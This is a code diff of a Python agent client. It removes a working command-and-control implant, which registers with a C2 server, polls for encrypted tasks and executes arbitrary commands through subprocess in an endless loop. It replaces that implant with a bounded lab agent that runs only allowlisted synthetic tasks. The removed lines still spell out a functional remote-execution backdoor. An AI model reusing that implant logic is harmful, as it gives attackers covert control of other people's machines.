@@ -1,119 +1,88 @@
-import socket
-import platform
-import os
+"""ANGEL agent client for authorized lab control-plane tests."""
+
+from __future__ import annotations
+
 import json
+import platform
+import socket
 import time
-import uuid
-import base64
 import urllib.request
-import subprocess  # nosec B404
-from .crypto import encrypt_message, decrypt_message
-from .shared_key import SHARED_KEY
+import uuid
+from typing import Any
 
-def get_agent_id():
-    return str(uuid.uuid4())[:8]
+from .policy import ALLOWED_TASKS
 
-def register(agent_id, c2_url):
-    data = {
-        "agent_id": agent_id,
-        "hostname": socket.gethostname(),
-        "os": platform.system() + " " + platform.release()
-    }
-    req = urllib.request.Request(
-        f"{c2_url}/register",
-        data=json.dumps(data).encode(),
-        headers={"Content-Type": "application/json"},
-        method="POST"
+
+def get_agent_id() -> str:
+    return str(uuid.uuid4())
+
+
+def _post(c2_url: str, path: str, payload: dict[str, Any], operator_key: str) -> dict[str, Any]:
+    request = urllib.request.Request(
+        f"{c2_url.rstrip('/')}{path}",
+        data=json.dumps(payload).encode(),
+        headers={"Content-Type": "application/json", "X-ANGEL-Key": operator_key},
+        method="POST",
     )
-    try:
-        with urllib.request.urlopen(req, timeout=10) as response:  # nosec B310
-            return json.loads(response.read().decode())
-    except Exception as e:
-        print(f"[-] Register failed: {e}")
-        return None
+    with urllib.request.urlopen(request, timeout=10) as response:  # nosec B310 - URL is operator-configured
+        value = json.loads(response.read().decode())
+        if not isinstance(value, dict):
+            raise ValueError("invalid server response")
+        return value
 
-def get_task_encrypted(agent_id, c2_url):
-    request_data = {"agent_id": agent_id}
-    encrypted = encrypt_message(json.dumps(request_data))
-    
-    data = {
-        "agent_id": agent_id,
-        "data": base64.b64encode(encrypted).decode()
-    }
-    req = urllib.request.Request(
-        f"{c2_url}/task",
-        data=json.dumps(data).encode(),
-        headers={"Content-Type": "application/json"},
-        method="POST"
+
+def register(agent_id: str, c2_url: str, operator_key: str = "development-operator-key") -> dict[str, Any]:
+    return _post(
+        c2_url,
+        "/register",
+        {"agent_id": agent_id, "hostname": socket.gethostname(), "os": platform.system(), "arch": platform.machine()},
+        operator_key,
     )
-    try:
-        with urllib.request.urlopen(req, timeout=10) as response:  # nosec B310
-            response_data = json.loads(response.read().decode())
-            if 'data' in response_data:
-                ciphertext = base64.b64decode(response_data['data'])
-                decrypted = decrypt_message(ciphertext)
-                return json.loads(decrypted)
-            return None
-    except Exception as e:
-        print(f"[-] Task check failed: {e}")
-        return None
 
-def send_result(agent_id, c2_url, command, output):
-    data = {
-        "agent_id": agent_id,
-        "command": command,
-        "output": output
-    }
-    req = urllib.request.Request(
-        f"{c2_url}/result",
-        data=json.dumps(data).encode(),
-        headers={"Content-Type": "application/json"},
-        method="POST"
-    )
-    try:
-        with urllib.request.urlopen(req, timeout=10) as response:  # nosec B310
-            return json.loads(response.read().decode())
-    except Exception as e:
-        print(f"[-] Send result failed: {e}")
-        return None
 
-def execute_command(cmd):
-    try:
-        result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=30)  # nosec B603
-        output = result.stdout + result.stderr
-        return output if output else "[+] Command executed (no output)"
-    except Exception as e:
-        return f"[-] Execution failed: {e}"
+def get_task(agent_id: str, c2_url: str, operator_key: str = "development-operator-key") -> dict[str, Any] | None:
+    response = _post(c2_url, "/task/claim", {"agent_id": agent_id}, operator_key)
+    task = response.get("task")
+    return task if isinstance(task, dict) else None
 
-def run_windows_implant():
+
+def send_result(
+    agent_id: str,
+    c2_url: str,
+    task_id: int,
+    payload: dict[str, Any],
+    operator_key: str = "development-operator-key",
+) -> dict[str, Any]:
+    return _post(c2_url, "/result", {"agent_id": agent_id, "task_id": task_id, "payload": payload}, operator_key)
+
+
+def execute_allowlisted_task(task: dict[str, Any]) -> dict[str, Any]:
+    task_type = task.get("type")
+    if task_type not in ALLOWED_TASKS:
+        raise ValueError("task type is not allowed")
+    if task_type == "heartbeat":
+        return {"status": "alive", "timestamp": int(time.time())}
+    if task_type == "self_test":
+        return {"status": "passed", "agent": "angel-agent"}
+    if task_type == "get_capabilities":
+        return {"tasks": sorted(ALLOWED_TASKS)}
+    if task_type == "collect_synthetic_inventory":
+        return {"hostname": "synthetic-host", "os": "synthetic-os", "source": "test-fixture"}
+    if task_type == "shutdown_agent":
+        return {"status": "shutdown-requested"}
+    return {"status": "accepted", "task": task_type}
+
+
+def run_windows_implant() -> None:
+    """Run a bounded lab agent loop; no arbitrary command execution is supported."""
     agent_id = get_agent_id()
-    c2_url = "http://localhost:8000"
-    
-    hostname = socket.gethostname()
-    os_info = platform.system() + " " + platform.release()
-    
-    print(f"[+] Windows implant started on {hostname}")
-    print(f"[+] Agent ID: {agent_id}")
-    print(f"[+] OS: {os_info}")
-    print(f"[+] Shared key: {SHARED_KEY.hex()[:16]}...")
-    
-    reg_result = register(agent_id, c2_url)
-    if reg_result and reg_result.get('status') == 'registered':
-        print("[+] Successfully registered to C2 server")
-    else:
-        print("[-] Failed to register to C2 server")
-        return
-    
-    print("[+] Entering task loop...")
-    while True:
-        task = get_task_encrypted(agent_id, c2_url)
-        if task and task.get('command'):
-            cmd = task['command']
-            print(f"[+] Executing: {cmd}")
-            output = execute_command(cmd)
-            print(f"[+] Output:\n{output}")
-            send_result(agent_id, c2_url, cmd, output)
-        else:
-            print("[+] No tasks available")
-        
-        time.sleep(5)
+    c2_url = "http://127.0.0.1:8000"
+    register(agent_id, c2_url)
+    for _ in range(1):
+        task = get_task(agent_id, c2_url)
+        if task and isinstance(task.get("id"), int):
+            result = execute_allowlisted_task({"type": task.get("type")})
+            send_result(agent_id, c2_url, task["id"], result)
+
+
+__all__ = ["get_agent_id", "register", "get_task", "send_result", "execute_allowlisted_task", "run_windows_implant"]
